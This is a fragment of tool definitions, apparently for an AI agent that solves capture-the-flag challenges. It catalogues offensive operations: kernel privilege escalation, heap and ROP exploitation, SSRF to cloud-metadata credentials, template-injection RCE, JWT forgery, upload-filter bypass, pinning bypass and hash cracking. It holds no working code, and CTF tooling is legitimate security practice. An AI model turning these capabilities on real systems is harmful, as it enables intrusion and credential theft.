    {"name":"ebpf_exploit","description":"eBPF exploitation: detect (kernel version + unprivileged BPF check + vuln taxonomy), verifier_bypass (explain OOB r/w approach + CVE references), skeleton (C exploit skeleton with libbpf). For kernel eBPF CTF challenges.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["detect","verifier_bypass","jit_spray","map_oob","priv_escalation","skeleton"]},"program_path":{"type":"string"},"vuln_type":{"type":"string"}},"required":["operation"]}},
    {"name":"ecc_special_attacks","description":"ECC special attacks: detect (Smart/MOV/Pohlig-Hellman/invalid-curve), smart (anomalous curve DLP in O(log p)), mov (supersingular Tate pairing), invalid_curve (small-order points for CRT key recovery), pohlig_hellman (smooth-order DLP). All use SageMath.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["detect","smart","mov","invalid_curve","pohlig_hellman"]},"p":{"type":"integer"},"a":{"type":"integer"},"b":{"type":"integer"},"n":{"type":"integer"},"Gx":{"type":"integer"},"Gy":{"type":"integer"},"Px":{"type":"integer"},"Py":{"type":"integer"},"k":{"type":"integer"}},"required":["operation"]}},
    {"name":"ethereum_exploit","description":"Ethereum/Solidity CTF exploitation: analyze (detect vulns in source), reentrancy (cross-function/read-only attack), selfdestruct (force ETH send), delegatecall (storage collision), tx_origin (auth bypass), flash_loan (price manipulation), storage_collision, setup (Foundry/Hardhat env).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["analyze","reentrancy","selfdestruct","delegatecall","tx_origin","flash_loan","storage_collision","access_control","integer_overflow","setup"]},"contract_source":{"type":"string"},"contract_address":{"type":"string"},"network":{"type":"string"},"target_function":{"type":"string"},"value_eth":{"type":"string"}},"required":["operation"]}},
    {"name":"firmware_unpack","description":"Firmware analysis: analyze (binwalk + file type), extract (filesystem extraction: JFFS2/UBI/squashfs), emulate (QEMU user-mode for ARM/MIPS/PPC), find_vulns (hardcoded creds, command injection, keys), strings_scan, entropy.","input_schema":{"type":"object","properties":{"firmware_path":{"type":"string"},"operation":{"type":"string","enum":["analyze","extract","emulate","find_vulns","strings_scan","entropy"]},"arch":{"type":"string"},"output_dir":{"type":"string"}},"required":["firmware_path"]}},
    {"name":"flutter_re","description":"Flutter/React Native/Dart reverse engineering: detect (identify framework), flutter_extract (libflutter.so + libapp.so from APK), dart_snapshot (analyze Dart AOT snapshot + reFlutter reference), rn_bundle (extract JS bundle), rn_deobfuscate (Hermes bytecode via hbcdump/hermes-dec).","input_schema":{"type":"object","properties":{"apk_path":{"type":"string"},"binary_path":{"type":"string"},"operation":{"type":"string","enum":["detect","flutter_extract","dart_snapshot","rn_bundle","rn_deobfuscate","strings"]}},"required":["operation"]}},
    {"name":"format_string_exploit","description":"Pwntools format string exploit helper. Ops: find_offset (brute %p chain to locate AAAA offset), read_stack (dump stack values), write_target (generate fmtstr_payload for GOT overwrite given offset+write_addr+write_val), auto_exploit (FmtStr full automation). Covers format_string_1/2/3.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"host":{"type":"string"},"port":{"type":"integer"},"operation":{"type":"string","enum":["find_offset","read_stack","write_target","auto_exploit"]},"write_addr":{"type":"string","description":"Target address (hex)"},"write_val":{"type":"string","description":"Value to write (hex)"},"offset":{"type":"integer","description":"Format string offset from find_offset"}},"required":["operation"]}},
    {"name":"fsop","description":"IO_FILE / FSOP exploitation for glibc ≥2.35 (no __free_hook/__malloc_hook). Ops: detect (check glibc version), fake_file (build _IO_FILE bytes), wide_data (_wide_data vtable attack for RIP), _io_list_all (overwrite chain), skeleton (full pwntools exploit).","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["detect","fake_file","wide_data","_io_list_all","skeleton"]},"libc_path":{"type":"string"},"target_func":{"type":"string"},"rip_control":{"type":"string"}},"required":["operation"]}},
    {"name":"gdb_remote","description":"Remote GDB debugging for challenges running gdbserver. Ops: connect (verify gdbserver alive + RSP handshake), run_script (execute GDB command script against remote target via gdb -batch), pwntools_remote (pwntools GDB remote attach), find_password (hook strcmp/strncmp/memcmp via GDB breakpoints to extract compared values), angr_remote (angr symbolic execution against local binary to find valid input). Covers pwn challenges where binary runs on a remote gdbserver rather than plain nc.","input_schema":{"type":"object","properties":{"host":{"type":"string"},"port":{"type":"integer","description":"gdbserver port (default 1234)"},"binary_path":{"type":"string","description":"Local copy of the remote binary (for symbols)"},"operation":{"type":"string","enum":["connect","run_script","pwntools_remote","find_password","angr_remote"]},"script":{"type":"string","description":"GDB commands for run_script op (one per line)"},"find_addr":{"type":"string","description":"Target address for angr_remote"},"avoid_addrs":{"type":"array","items":{"type":"string"},"description":"Addresses to avoid for angr_remote"},"timeout":{"type":"integer"}},"required":["host"]}},
    {"name":"go_rev","description":"Go binary reverse engineering: analyze (version + suspicious strings), symbols (GoReSym symbol recovery for stripped binaries), functions (list all Go functions via nm/r2), pcln (parse pclntab to recover function names), strings (Go string table extraction).","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["analyze","symbols","functions","pcln","strings","types"]},"output_dir":{"type":"string"}},"required":["binary_path"]}},
    {"name":"hash_crack","description":"Identify and crack hashes (MD5/SHA1/SHA256/SHA512/bcrypt/NTLM). Ops: auto (identify then online then hashcat), identify (detect type only), wordlist (hashcat -a 0 rockyou.txt), bruteforce (hashcat -a 3 mask), online_lookup (CrackStation + hashes.com). Essential for hashcrack challenge class and NTLM hashes in forensics.","input_schema":{"type":"object","properties":{"hash_value":{"type":"string"},"operation":{"type":"string","enum":["auto","identify","wordlist","bruteforce","online_lookup"]},"wordlist":{"type":"string"},"hash_type":{"type":"string","description":"Force type: md5/sha1/sha256/sha512/ntlm/bcrypt"}},"required":["hash_value"]}},
    {"name":"house_of_exploit","description":"House of * heap exploitation for glibc ≥2.31 (post-__free_hook era). Techniques: detect, orange (unsorted_bin→__malloc_hook), force (top chunk), spirit (free fake chunk), lore (large_bin bk_nextsize AAW), einherjar (off-by-null consolidation), poison_null_byte, off_by_one.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"technique":{"type":"string","enum":["detect","orange","force","spirit","lore","einherjar","tangerine","poison_null_byte","off_by_one"]},"libc_path":{"type":"string"},"libc_version":{"type":"string"},"target_addr":{"type":"string"},"cmd":{"type":"string"}},"required":["technique"]}},
    {"name":"image_steg_advanced","description":"Advanced image steganography beyond basic LSB/zsteg. Ops: auto (run all checks), msb (most-significant-bit extraction from R/G/B), color_planes (save each RGB/A channel as separate PNG), bit_plane_extract (extract specific bit 0-7 from each channel + check for flag), fourier (FFT magnitude spectrum for frequency-domain steg), palette_steg (hidden data in PNG indexed palette LSBs), alpha_extract (alpha channel raw + LSB), outguess (JPEG steg via outguess), stegsolve (all 64 bit/channel/order combos in one sweep), metadata_deep (exiftool -a -u -g + identify -verbose). Covers LoadSomeBits MSB, RED rgba LSB, and any non-standard steg channel.","input_schema":{"type":"object","properties":{"image_path":{"type":"string"},"operation":{"type":"string","enum":["auto","msb","color_planes","bit_plane_extract","fourier","palette_steg","alpha_extract","outguess","stegsolve","metadata_deep"]},"channel":{"type":"string","description":"R/G/B/A or all"},"bit_plane":{"type":"integer","description":"Bit plane 0-7 for bit_plane_extract"},"output_path":{"type":"string"}},"required":[]}},
    {"name":"ios_vuln","description":"iOS vulnerability analysis: scan (objection/idb overview), keychain (dump keychain items via Frida/objection), nsuserdefaults (insecure storage), jailbreak_bypass (Frida JB detection bypass script), method_swizzling (ObjC hook template), runtime_analysis (frida-trace), url_scheme.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["scan","keychain","nsuserdefaults","url_scheme","jailbreak_bypass","method_swizzling","runtime_analysis","network_analysis"]},"target":{"type":"string"},"bundle_id":{"type":"string"},"device":{"type":"string"}},"required":["operation"]}},
    {"name":"ipa_analyze","description":"iOS IPA analysis: all (overview), extract (unzip app bundle), plist (Info.plist + all plists), class_dump (ObjC headers), strings (secrets), entitlements (code signing), find_vulns (ATS bypass, URL schemes, keychain misuse, WebView), binary_analysis (checksec + encryption).","input_schema":{"type":"object","properties":{"ipa_path":{"type":"string"},"operation":{"type":"string","enum":["all","extract","plist","class_dump","strings","entitlements","find_vulns","binary_analysis","swift_decompile"]},"output_dir":{"type":"string"},"class_filter":{"type":"string"}},"required":["ipa_path"]}},
    {"name":"java_sandbox","description":"Compile and run Java source code, or reverse Java checkPassword logic. Ops: run (javac+java), analyze (extract flag from charAt/XOR/int-packed patterns), solve (auto-extract flag), decompile (javap -c). Critical for Vault Door, crackme, and all Java source reversing challenges.","input_schema":{"type":"object","properties":{"source_code":{"type":"string"},"source_path":{"type":"string"},"operation":{"type":"string","enum":["run","analyze","solve","decompile"]},"class_name":{"type":"string"},"stdin_input":{"type":"string"},"timeout":{"type":"integer"}},"required":["operation"]}},
    {"name":"kernel_lpe","description":"Linux kernel LPE: detect (version + mitigations: SMEP/SMAP/KPTI/kptr_restrict), dirty_pipe (CVE-2022-0847), modprobe_path (arbitrary root cmd), userfaultfd_uaf (race slowdown), ret2usr (with SMEP/SMAP/KPTI bypass), slub_overflow (SLUB heap grooming).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["detect","dirty_pipe","modprobe_path","userfaultfd_uaf","ret2usr","slub_overflow","skeleton"]},"module_path":{"type":"string"},"vuln_type":{"type":"string"},"target_cred":{"type":"string"}},"required":["operation"]}},
    {"name":"node_exec","description":"Execute JavaScript/Node.js code. Ops: run (write .js + node execute), eval_snippet (node -e inline), heapsnapshot_grep (stream-parse .heapsnapshot JSON and grep for flag pattern — key for head-dump challenge), deobfuscate_run (run obfuscated JS, capture all console.log). Covers Bookmarklet XOR, head-dump heapsnapshot, client-side JS.","input_schema":{"type":"object","properties":{"code":{"type":"string"},"file_path":{"type":"string","description":"Path to .js or .heapsnapshot file"},"operation":{"type":"string","enum":["run","eval_snippet","heapsnapshot_grep","deobfuscate_run"]},"pattern":{"type":"string","description":"Grep pattern for heapsnapshot_grep (default: picoCTF{)"},"timeout":{"type":"integer"}},"required":["operation"]}},
    {"name":"pcap_deep","description":"Deep PCAP analysis: summary (protocol stats), decrypt_export (RSA privkey → decrypt TLS → tshark --export-objects http), dns_exfil (detect/reconstruct DNS tunnel from hex/b64 subdomains), covert_channel (timing bits/ICMP/HTTP-header), credentials (extract plaintext creds), extract_streams, ftp_extract, smtp_extract.","input_schema":{"type":"object","properties":{"pcap_path":{"type":"string"},"operation":{"type":"string","enum":["summary","decrypt_export","dns_exfil","covert_channel","credentials","extract_streams","ftp_extract","smtp_extract","strings_all"]},"key_path":{"type":"string"},"output_dir":{"type":"string"},"filter_expr":{"type":"string"},"keyword":{"type":"string"}},"required":["pcap_path","operation"]}},
    {"name":"pe_analysis","description":"Windows PE analysis — ELF binary_analysis misses all PE structure. Ops: info (headers, sections, imports, TLS via pefile), resources (list + wrestool extract), icons (extract ICO, convert PNG), strings (pefile section scan), unpack (detect UPX/Themida/MPRESS, run upx -d). Covers Windows crackme and .exe embedded-flag challenges.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string","description":"Path to .exe/.dll/.sys"},"operation":{"type":"string","enum":["info","resources","icons","strings","unpack"]},"resource_type":{"type":"string"},"output_dir":{"type":"string"}},"required":["binary_path"]}},
    {"name":"polyglot_file","description":"Generate polyglot files valid as two formats simultaneously (GIF+PHP, JPG+PHP, SVG+XSS, PDF+HTML, ZIP+PHP) to bypass upload type checks. Ops: list (catalog), generate (create file), check (file + exiftool inspect).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["list","generate","check"]},"file_type_a":{"type":"string"},"file_type_b":{"type":"string"},"content":{"type":"string"},"input_path":{"type":"string"},"output_path":{"type":"string"}},"required":["operation"]}},
    {"name":"powershell_deobf","description":"PowerShell script deobfuscation: deobfuscate (base64+gzip+char decode chain), amsi_detect (find AMSI bypass patches), iex_extract (pull Invoke-Expression payloads), strings (all cleartext string literals), run_safe (execute in constrained language mode).","input_schema":{"type":"object","properties":{"script_path":{"type":"string"},"script_content":{"type":"string"},"operation":{"type":"string","enum":["deobfuscate","amsi_detect","iex_extract","strings","run_safe","decode_chain"]}},"required":["operation"]}},
    {"name":"pqc_attack","description":"Post-quantum crypto attacks: detect (BKZ beta estimate for LWE params), lwe_attack (primal BDD via Sage lattice embedding), ntru_attack (LLL key recovery), kyber_fault (fault injection model), zkp_attack (ZK proof soundness exploits).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["detect","lwe_attack","ntru_attack","kyber_fault","zkp_attack"]},"n":{"type":"integer"},"q":{"type":"integer"},"samples":{"type":"array"},"N":{"type":"integer"},"h":{"type":"array"}},"required":["operation"]}},
    {"name":"pyjail_escape","description":"Python sandbox escape: detect (analyze restrictions), escape_chains (20 ordered techniques: subclass walk, builtins restore, frame inspection, breakpoint, timeit, f-string, code objects), subclass_walk (find useful __subclasses__), builtins_restore, audit_hooks_bypass (ctypes bypass for sys.addaudithook).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["detect","escape_chains","subclass_walk","builtins_restore","audit_hooks_bypass","fstring","code_object"]},"jail_code":{"type":"string"},"available":{"type":"string"},"blocked":{"type":"string"}},"required":["operation"]}},
    {"name":"qr_decode","description":"Decode QR codes, DataMatrix, Code128, and all barcode types from image files. Ops: decode (zbarimg + pyzbar fallback), scan_all (both decoders merged), barcode (force type: qr/code128/datamatrix/ean), generate (qrencode data string to PNG). Appears in ~10% of picoCTF forensics challenges.","input_schema":{"type":"object","properties":{"image_path":{"type":"string"},"operation":{"type":"string","enum":["decode","scan_all","barcode","generate"]},"barcode_type":{"type":"string","description":"Force barcode type (default: any)"},"data":{"type":"string","description":"String to encode (for generate op)"}},"required":[]}},
    {"name":"rop_chain","description":"ROP chain builder wrapping pwntools ROP(). Goals: shell/ret2libc, syscall/execve, write_what_where. Auto-selects gadgets, handles x86_64 stack alignment. Also: gadgets (dump via ROPgadget), checksec, one_gadget.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["build","gadgets","checksec"]},"goal":{"type":"string","enum":["shell","ret2libc","syscall","execve","write_what_where","one_gadget"]},"libc_path":{"type":"string"},"base_addr":{"type":"string"},"extra_gadgets":{"type":"string"}},"required":["binary_path"]}},
    {"name":"rust_sandbox","description":"Compile and run Rust source code (rustc). Like java_sandbox but for Rust. Ops: run (compile + execute), fix_and_run (apply patch='OLD|||NEW' or unified diff then compile+run), analyze (HIR dump), decompile (strings+nm). Covers Rust-Fixme 1/2/3 series.","input_schema":{"type":"object","properties":{"source_code":{"type":"string"},"source_path":{"type":"string"},"operation":{"type":"string","enum":["run","fix_and_run","analyze","decompile"]},"patch":{"type":"string","description":"For fix_and_run: 'OLD|||NEW' replacement or unified diff"},"timeout":{"type":"integer"}},"required":[]}},
    {"name":"sdr_analyze","description":"SDR/RF signal analysis: analyze (file inspection), demodulate (AM/FM/FSK/OOK/BPSK/QPSK), spectrum (ASCII frequency plot), decode_ook (On-Off Keying binary extraction), replay (generate replay payload). Supports .wav/.iq/.cf32/.cs8 files.","input_schema":{"type":"object","properties":{"file_path":{"type":"string"},"operation":{"type":"string","enum":["analyze","demodulate","spectrum","decode_ook","decode_dtmf","replay"]},"frequency":{"type":"number"},"sample_rate":{"type":"number"},"modulation":{"type":"string"}},"required":["operation"]}},
    {"name":"solve_resume","description":"Serialize/resume conversation state for multi-hour solves. Prevents losing Opus iterations on network failures. Ops: save, load, list, delete, checkpoint. Stores turns, iteration count, hypotheses, flags, workspace path.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["save","load","list","delete","checkpoint"]},"session_id":{"type":"string"},"state_path":{"type":"string"},"conversation":{"type":"array"},"metadata":{"type":"object"}},"required":["operation"]}},
    {"name":"ssh_exec","description":"SSH with password/key auth, command execution, SCP download, interactive game protocol. Ops: run_command (exec + return stdout), scp_download (pull remote_path via SCP/SFTP), interactive_game (shell with binary_search:lo:hi shorthand or custom script lines), connect (probe+banner). Covers Binary Search SSH game and hash-only-1 SCP challenge.","input_schema":{"type":"object","properties":{"host":{"type":"string"},"port":{"type":"integer"},"username":{"type":"string"},"password":{"type":"string"},"key_path":{"type":"string"},"operation":{"type":"string","enum":["run_command","scp_download","interactive_game","connect"]},"command":{"type":"string"},"remote_path":{"type":"string"},"local_path":{"type":"string"},"script":{"type":"string","description":"For interactive_game: 'binary_search:1:1000' or newline-separated responses"}},"required":["host"]}},
    {"name":"ssl_pinning_bypass","description":"SSL/certificate pinning bypass: frida (universal Android+iOS Frida bypass script for OkHttp/TrustManager/NSURLSession), objection (objection ssl disable), apktool_patch (network_security_config patch + resign APK), ios_frida, custom (hook specific class).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["frida","objection","apktool_patch","ios_frida","custom"]},"target":{"type":"string"},"package_name":{"type":"string"},"method":{"type":"string"}},"required":["operation"]}},
    {"name":"ssrf_chain","description":"SSRF automated exploitation: probe (detect), cloud_metadata (AWS/GCP/Azure IMDS credentials), port_scan (internal network), redis_rce (gopher→RCE), protocol_smuggle (gopher/dict/file/ldap/tftp payloads + IP filter bypasses).","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["probe","cloud_metadata","port_scan","redis_rce","protocol_smuggle"]},"param":{"type":"string"},"method":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"},"internal_target":{"type":"string"},"custom_payload":{"type":"string"}},"required":["target_url"]}},
    {"name":"ssti_rce","description":"SSTI detection + engine-specific RCE escalation. Ops: detect (probe URL with polymath probes), escalate (sandbox escape chains), payloads (dump without requests), list_engines. Engines: jinja2, jinja2_sandbox, twig, freemarker, velocity, mako, erb, tornado, smarty, handlebars, pebble.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["detect","escalate","payloads","list_engines"]},"engine":{"type":"string"},"target_url":{"type":"string"},"param":{"type":"string"},"method":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"},"custom_payload":{"type":"string"}},"required":["operation"]}},
    {"name":"swagger_fuzz","description":"Enumerate OpenAPI/Swagger specs and test endpoints for sensitive data. Ops: discover (probe /api-docs /swagger.json /openapi.json /actuator), parse_spec (list all paths+methods), test_all (call every GET endpoint, flag interesting), download_artifact (stream binary from endpoint e.g. /actuator/heapdump to output_path). Covers head-dump and Spring Boot Actuator challenges.","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["discover","parse_spec","test_all","download_artifact"]},"endpoint":{"type":"string","description":"Endpoint path for download_artifact"},"output_path":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"}},"required":["target_url"]}},
    {"name":"swift_decompile","description":"iOS Swift binary analysis: analyze (file + encryption check), demangle (Swift symbol demangling via swift-demangle), class_hierarchy (class-dump + ObjC metadata), strings (Swift + ObjC string literals), frida_hooks (Swift-aware Frida hook templates).","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"ipa_path":{"type":"string"},"operation":{"type":"string","enum":["analyze","demangle","class_hierarchy","strings","protocols","frida_hooks"]}},"required":["operation"]}},
    {"name":"vm_devirt","description":"VM devirtualization for VMProtect/Themida/custom VM: detect (identify protector + dispatcher), trace (Frida/Unicorn execution trace), lift (bytecode→C from opcode_map), devirt_skeleton (analysis script template).","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["detect","trace","lift","devirt_skeleton"]},"handler_addr":{"type":"string"},"opcode_map":{"type":"object"}},"required":["binary_path"]}},
    {"name":"windows_forensics","description":"Windows artifact forensics: registry (SAM/SYSTEM/SOFTWARE hive parsing, credential extraction), event_logs (EVTX: logon events 4624/4625, PowerShell), prefetch, lnk_files, shellbags, browser_history (Chrome/Firefox SQLite), credentials (secretsdump).","input_schema":{"type":"object","properties":{"path":{"type":"string"},"operation":{"type":"string","enum":["all","registry","event_logs","prefetch","lnk_files","credentials","browser_history","shellbags","amcache"]},"output_dir":{"type":"string"},"keyword":{"type":"string"}},"required":["path"]}},
    {"name":"xs_leak","description":"XS-Leak and CSS injection oracle for information leakage web challenges. Ops: css_oracle (generate CSS attribute selector payload for secret attribute probing), lru_setup (upload marker files + garbage prefill to approach Redis memory limit), lru_flood (flood Redis to trigger LRU eviction), lru_probe (probe all marker IDs: 200=survived/touched, 404=evicted), reconstruct (beam-search + LLR scoring to recover secret from survived markers), full_pipeline (orchestration guide for picoCTF 2026 Paper-2 attack), error_oracle (probe URL list by status code), frame_count (count iframes as oracle bit). Essential for Paper-2 2026 (CSS+LRU side-channel) and elements-2024 (frame counting).","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["css_oracle","lru_setup","lru_flood","lru_probe","reconstruct","full_pipeline","error_oracle","frame_count"]},"secret_endpoint":{"type":"string","description":"Endpoint that renders secret in HTML attribute (default /secret)"},"secret_attr":{"type":"string","description":"HTML attribute name holding secret (default: secret)"},"charset":{"type":"string","description":"Characters in the secret (default: 0123456789abcdef)"},"secret_len":{"type":"integer","description":"Length of secret to recover (default: 32)"},"upload_endpoint":{"type":"string","description":"File upload endpoint (default: /upload)"},"visit_endpoint":{"type":"string","description":"Bot trigger endpoint (default: /visit)"},"output":{"type":"object","description":"Carry state between ops: markers dict, survived list, etc."}},"required":["target_url"]}},
    {"name":"zkp_attack","description":"ZK proof system attacks: detect (identify system + vuln patterns), null_constraint (under-constrained Circom signals), weak_fiat_shamir (replay/grinding), groth16_malleability (rerandomize proof), plonk_soundness (constraint extraction).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["detect","null_constraint","weak_fiat_shamir","groth16_malleability","plonk_soundness"]},"circuit_code":{"type":"string"}},"required":["operation"]}},

    # ── 23 new tools — external tool wrappers ─────────────────────────────────
    {"name":"rsa_toolkit","description":"RSA attack toolkit wrapping RsaCtfTool (github.com/RsaCtfTool/RsaCtfTool). Ops: auto (try all attacks), fermat (Fermat factoring for p\u2248q \u2014 most common picoCTF miss), wiener (small d), hastads (small e broadcast), common_modulus, batch_gcd (factor N from list of moduli with gcd), multiprime (3+ prime RSA), factor_only. Falls back to sympy/gmpy2 pure-Python for fermat+batch_gcd when RsaCtfTool missing.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["auto","fermat","wiener","hastads","common_modulus","batch_gcd","multiprime","factor_only"]},"n":{"type":"string"},"e":{"type":"string"},"c":{"type":"string"},"p":{"type":"string"},"q":{"type":"string"},"factors":{"type":"array","items":{"type":"string"}},"moduli":{"type":"array","items":{"type":"string"}},"output_file":{"type":"string"}},"required":[]}},
    {"name":"cbc_oracle","description":"CBC padding oracle attack wrapping padbuster / paddingoracle. Ops: decrypt (recover plaintext byte-by-byte via oracle), encrypt (encrypt arbitrary plaintext via oracle), probe (verify oracle is working \u2014 distinguishable padding error response), padbuster (shell to padbuster CLI for full automation). Provide target_url + ciphertext_hex + oracle_param.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["decrypt","encrypt","probe","padbuster"]},"target_url":{"type":"string"},"ciphertext_hex":{"type":"string"},"block_size":{"type":"integer"},"oracle_param":{"type":"string"},"method":{"type":"string"},"encoding":{"type":"string"},"known_plaintext":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"}},"required":["target_url","ciphertext_hex"]}},
    {"name":"vigenere_crack","description":"Automated Vigenere cipher cracking \u2014 Kasiski test + Index of Coincidence key length + per-column frequency analysis. No external deps needed. Ops: crack (auto find key + decrypt), kasiski (repeated trigram spacing), ic_key_length (IC analysis per key length), recover_key (given key length, recover key by frequency).","input_schema":{"type":"object","properties":{"ciphertext":{"type":"string"},"operation":{"type":"string","enum":["crack","kasiski","ic_key_length","recover_key"]},"key_length":{"type":"integer"},"known_key":{"type":"string"}},"required":["ciphertext"]}},
    {"name":"side_channel","description":"Statistical timing side-channel attack \u2014 measures response time per character to recover secrets byte-by-byte. Ops: timing_attack (probe target URL with each charset char, find outlier timing for each position), analyze_timings (given [(char,time)] list compute z-scores), bit_leak_extract (binary search timing oracle).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["timing_attack","analyze_timings","bit_leak_extract"]},"target_url":{"type":"string"},"param":{"type":"string"},"charset":{"type":"string"},"known_prefix":{"type":"string"},"secret_len":{"type":"integer"},"method":{"type":"string"},"samples":{"type":"integer"},"measurements":{"type":"array"},"headers":{"type":"object"},"cookies":{"type":"object"}},"required":["operation"]}},
    {"name":"one_gadget","description":"Wrapper around one_gadget Ruby gem (github.com/david942j/one_gadget). Finds single-gadget RCE addresses in libc that give a shell when register constraints are met. Ops: find (list all gadgets + constraints), best (highest probability gadget), find_with_leak (compute absolute gadget addresses from a libc leak + symbol), check_constraints (verify usable gadgets given register state). Falls back to ROPgadget execve search if gem not installed.","input_schema":{"type":"object","properties":{"libc_path":{"type":"string"},"operation":{"type":"string","enum":["find","best","find_with_leak","check_constraints"]},"leak_addr":{"type":"string"},"leak_symbol":{"type":"string"},"constraints":{"type":"object"}},"required":[]}},
    {"name":"pwn_template","description":"Exploit template generator using pwninit + pwntools. Ops: generate (full exploit scaffold from binary analysis \u2014 auto-detects arch, PIE, RELRO, creates pwntools script), stack_template (ret2win/ROP scaffold), heap_template (heap exploit scaffold with menu interaction helpers), rop_template (ROP chain scaffold with libc leak pattern), pwninit (run pwninit to patch binary + create solve.py). Pass checksec output for smarter templates.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"host":{"type":"string"},"port":{"type":"integer"},"operation":{"type":"string","enum":["generate","stack_template","heap_template","rop_template","pwninit"]},"vuln_type":{"type":"string","enum":["auto","stack","heap","format_string"]},"libc_path":{"type":"string"}},"required":[]}},
    {"name":"heap_visualize","description":"Parse and visualize pwndbg/GDB heap state. Ops: live (attach to process, run pwndbg heap/bins/vis_heap_chunks commands), parse_state (parse raw pwndbg output into structured chunk/bin data), find_overlap (detect overlapping chunks \u2014 common in heap overflow challenges), tcache_status (parse tcache bins and counts), check_double_free (scan for same address in multiple bins).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["live","parse_state","find_overlap","tcache_status","check_double_free"]},"gdb_output":{"type":"string"},"binary_path":{"type":"string"},"pid":{"type":"integer"}},"required":["operation"]}},
    {"name":"libc_database","description":"Extended libc lookup via libc.rip API + pwntools. Ops: search (find libc from leak_addr + symbol \u2014 returns build IDs + all symbol offsets), identify (narrow down with multiple leak+symbol pairs), download (download matching libc .so from libc.rip to /tmp), offsets (print all useful symbol offsets for a build), one_gadgets (get one_gadget offsets for downloaded libc).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["search","identify","download","offsets","one_gadgets"]},"leak_addr":{"type":"string"},"symbol":{"type":"string","description":"Known leaked symbol name e.g. puts, printf"},"extra_symbols":{"type":"object"},"build_id":{"type":"string"},"arch":{"type":"string"}},"required":["operation"]}},
    {"name":"string_decryptor","description":"Obfuscated string extractor wrapping FLOSS (Mandiant/flare-floss \u2014 pip install flare-floss). Extracts stack strings, tight-loop decoded strings, and XOR-obfuscated strings automatically. Ops: floss (run FLOSS for all string types), xor_scan (brute all 256 single-byte XOR keys and check for flag pattern), stack_strings (FLOSS stack strings only), tight_loops (FLOSS tight loop decoded strings only), decode_with_key (given known key + algorithm, decrypt all matching strings).","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["floss","xor_scan","stack_strings","tight_loops","decode_with_key"]},"key":{"type":"string","description":"Hex key for decode_with_key"},"algorithm":{"type":"string"},"decompiled_code":{"type":"string"}},"required":[]}},
    {"name":"license_check","description":"License/serial check extractor using angr symbolic execution + frida/GDB hooks. Ops: hook_comparisons (frida intercept strcmp/strncmp/memcmp at runtime \u2014 prints both sides of every comparison), angr_keygen (angr symbolic execution to find valid input that reaches success path), patch_check (identify check location for binary_patch), frida_hook (custom frida JS script against binary).","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["hook_comparisons","angr_keygen","patch_check","frida_hook"]},"username":{"type":"string"},"input_value":{"type":"string","description":"Input to feed via stdin when hooking"},"timeout":{"type":"integer"}},"required":["binary_path"]}},
    {"name":"proto_decode","description":"Protobuf decoder wrapping blackboxprotobuf (pip install blackboxprotobuf) + protoc --decode_raw. No .proto schema needed. Ops: decode (decode raw protobuf hex/base64/bytes \u2014 returns JSON), schema_guess (infer approximate .proto schema from wire format), encode (encode JSON dict back to protobuf bytes), from_file (decode a binary file as protobuf), decode_raw (shell to protoc --decode_raw for quick view).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["decode","schema_guess","encode","from_file","decode_raw"]},"data":{"type":"string","description":"Hex or base64 protobuf bytes"},"binary_path":{"type":"string"},"output_format":{"type":"string"}},"required":["operation"]}},
    {"name":"jwt_forge","description":"JWT attack toolkit wrapping jwt_tool (github.com/ticarpi/jwt_tool \u2014 pip install jwt-tool) with PyJWT/pycryptodome fallbacks. Ops: analyze (decode all parts), alg_none (forge with no signature \u2014 alg:none), rs256_hs256 (RS256\u2192HS256 confusion attack \u2014 sign with RSA public key as HMAC secret), kid_injection (kid header path traversal to /dev/null for empty-key signing), jku_redirect (jku header pointing to attacker JWKS URL), crack (brute-force HS256 secret with wordlist), forge (sign new payload with known secret + payload overrides).","input_schema":{"type":"object","properties":{"token":{"type":"string"},"operation":{"type":"string","enum":["analyze","alg_none","rs256_hs256","kid_injection","jku_redirect","crack","forge"]},"pubkey_path":{"type":"string"},"secret":{"type":"string"},"attacker_url":{"type":"string"},"kid":{"type":"string"},"payload_overrides":{"type":"object"},"wordlist":{"type":"string"}},"required":["operation"]}},
